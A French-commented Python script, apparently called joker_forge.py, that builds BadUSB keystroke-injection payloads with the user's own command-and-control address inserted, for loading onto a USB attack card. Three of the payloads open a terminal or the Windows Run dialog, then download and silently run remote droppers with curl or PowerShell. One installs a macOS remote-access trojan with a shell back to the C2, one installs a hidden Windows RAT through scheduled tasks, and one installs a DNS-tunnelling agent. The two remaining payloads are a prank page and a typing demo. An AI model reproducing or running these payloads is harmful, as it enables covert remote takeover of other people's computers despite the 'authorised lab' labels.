#!/usr/bin/env python3
# language: Python 3, file: joker_forge.py, target: macOS
# JOKER FORGE - cuit les payloads BadUSB de la carte avec TON C2 dedans
# Usage: python3 joker_forge.py [url_du_C2]
# Les payloads partent dans payloads/ - a uploader via le module Storage de la carte
import os, sys
sys.path.insert(0, os.path.expanduser('~/Desktop/tool_DC'))
import dc_fullscreen as dfs

C2 = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.1.222:8080"
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
os.makedirs(OUT, exist_ok=True)

PAYLOADS = {
    # le RAT RickPortal : portal.command auto-extractant -> agents LaunchAgents -> shell au C2
    "01_rat_dropper_mac.txt": f"""REM JOKER CARD - RAT dropper macOS (lab autorise)
REM deploie le construct RickPortal : shell de retour au C2 {C2}
DELAY 2000
GUI SPACE
DELAY 800
STRING Terminal
ENTER
DELAY 1500
STRING curl -sL {C2}/portal.command -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p
ENTER
""",

    # le RAT Windows : vbs silencieux -> INSTALLER.bat -> taches planifiees -> shell
    "02_rat_dropper_win.txt": f"""REM JOKER CARD - RAT dropper Windows (lab autorise)
DELAY 2000
GUI r
DELAY 600
STRING powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest '{C2}/RickPortal_win.zip' -OutFile $env:TEMP\\lz.zip; Expand-Archive $env:TEMP\\lz.zip $env:TEMP\\lz -Force; Start-Process cmd -ArgumentList '/c','""$env:TEMP\\lz\\INSTALLER.bat""' -WindowStyle Hidden"
ENTER
""",

    # l'agent DNS S.T.A.R. : les commandes passent par le DNS, rien d'autre ne transite
    "03_dns_agent_star.txt": f"""REM JOKER CARD - agent DNS S.T.A.R. (lab autorise)
DELAY 2000
GUI SPACE
DELAY 800
STRING Terminal
ENTER
DELAY 1500
STRING curl -sL {C2}/star_dns_agent -o /tmp/.d && chmod +x /tmp/.d && /tmp/.d <IP_DNS_C2> 53
ENTER
""",

    # le prank plein ecran de la carte : page kiosque, sortie = taper le combo
    "04_prank_fullscreen.txt": """REM JOKER CARD - prank plein ecran (sortie : taper JOKER)
DELAY 2000
GUI SPACE
DELAY 800
STRING Terminal
ENTER
DELAY 1200
STRING open "https://example.com/prank.html"
ENTER
""",

    # demo HID autorisee : le salut joker
    "05_typer_demo.txt": """REM JOKER CARD - demo clavier (machine de test autorisee)
DELAY 1500
STRING why so serious?
ENTER
STRING JOKER CARD - powered by Maxime Leal
ENTER
""",
}

for name, body in PAYLOADS.items():
    body = body.replace("__C2__", C2)
    open(os.path.join(OUT, name), "w").write(body)
    print(f"[OK] {name}")

print(f"\n[*] C2 cuit dans les payloads : {C2}")
print("[*] envoie-les sur la carte : panel web 192.168.4.1 -> Storage -> upload")
print("[*] branche la carte en USB sur la machine de lab -> BadUSB -> execute")
